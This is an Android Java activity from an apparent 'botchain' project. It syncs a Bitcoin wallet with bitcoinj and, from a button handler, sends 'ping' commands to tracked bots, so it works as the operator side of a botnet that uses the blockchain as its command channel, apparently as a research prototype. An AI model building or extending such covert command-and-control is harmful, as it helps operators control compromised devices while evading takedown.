package com.example.tonipagliaro.botchain;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.bitcoinj.core.Coin;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.listeners.DownloadProgressTracker;
import org.bitcoinj.wallet.Wallet;
import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;

import java.util.Date;

public class MainActivity extends AppCompatActivity {

    ApplicationState appState;

    ProgressBar progressBar;
    TextView textView;

    DownloadProgressTracker downloadTracker;
    int progressBarStatus = 0;
    private Handler progressBarHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appState = (ApplicationState) getApplication();

        progressBar = (ProgressBar) this.findViewById(R.id.progressBar);
        textView = (TextView) this.findViewById(R.id.textView);
        Log.d("App", appState.wallet.getBalance().toFriendlyString());

        Log.d("App", "MainActivity");
        appState.wallet.addCoinsReceivedEventListener(new WalletCoinsReceivedEventListener() {
            @Override
            public void onCoinsReceived(Wallet wallet, Transaction tx, Coin prevBalance, Coin newBalance) {
                Log.d("App", appState.wallet.getBalance().toFriendlyString());
                appState.saveWallet();
                //trovare indirizzo del bot da transaction

            }
        });

        new DownloadBlockchain().execute();



    }

    private class DownloadBlockchain extends AsyncTask<Void, Integer, String> {

        @Override
        protected String doInBackground(Void... par) {
            //PeerGroup peerGroup = new PeerGroup(appState.params, appState.chain);
            //peerGroup.addPeerDiscovery(new DnsDiscovery(appState.params));
            //peerGroup.addWallet(appState.wallet);
            Log.d("App", "Scarico la blockchain");

            appState.peerGroup.start();
            appState.peerGroup.startBlockChainDownload(downloadTracker = new DownloadProgressTracker() {

                @Override
                protected void progress(double pct, int blocksSoFar, Date date) {
                    publishProgress((int) pct);
                }

                @Override
                public void doneDownload() {
                    publishProgress(100);
                }

            });
            //appState.downloadBlockchainFromPeers(downloadTracker);
            try {
                downloadTracker.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
                Log.e("App", "Errore durante il download della blockchain");
            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            progressBar.setProgress(values[0]);
            textView.setText(values[0] + " %");
        }

        @Override
        protected void onPostExecute(String s) {


            appState.saveWallet();

            textView.setVisibility(View.INVISIBLE);

            Button b=(Button)findViewById(R.id.button);
            Log.d("App",appState.wallet.currentReceiveKey().toAddress(appState.params).toString());
            b.setVisibility(View.VISIBLE);
            b.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    try {

                        appState.wallet.addWatchedAddress(appState.wallet.freshReceiveAddress());

                        Log.d("MAP", "MAPPA PRIMA PING INIZIALE");
                        appState.logMappaIndirizzi();
                        //Inviamo il comando solo ai bot che hanno lo stato START (0,002 Bitcoin)
                        String message = "ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString();
                        Log.d("App", "NUMERO DEI BOT CON STATO START: " +appState.getBotStateStart().size());
                        appState.sendCommand(message);

                        //Inviamo il comando solo ai bot che hanno lo stato ONLINE (0,001 Bitcoin)
                        //appState.sendCommand(Coin.MILLICOIN, message, appState.getBotStateOnline());

                        //Cambia lo stato dei bot in "no"
                        appState.setStatoBots(appState.BOT_STATE_OFFLINE);

                        Log.d("MAP", "MAPPA DOPO PING INIZIALE");
                        appState.logMappaIndirizzi();

                        Intent intent = new Intent(MainActivity.this, BotListActivity.class);
                        startActivity(intent);

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            });

        }



    }



}
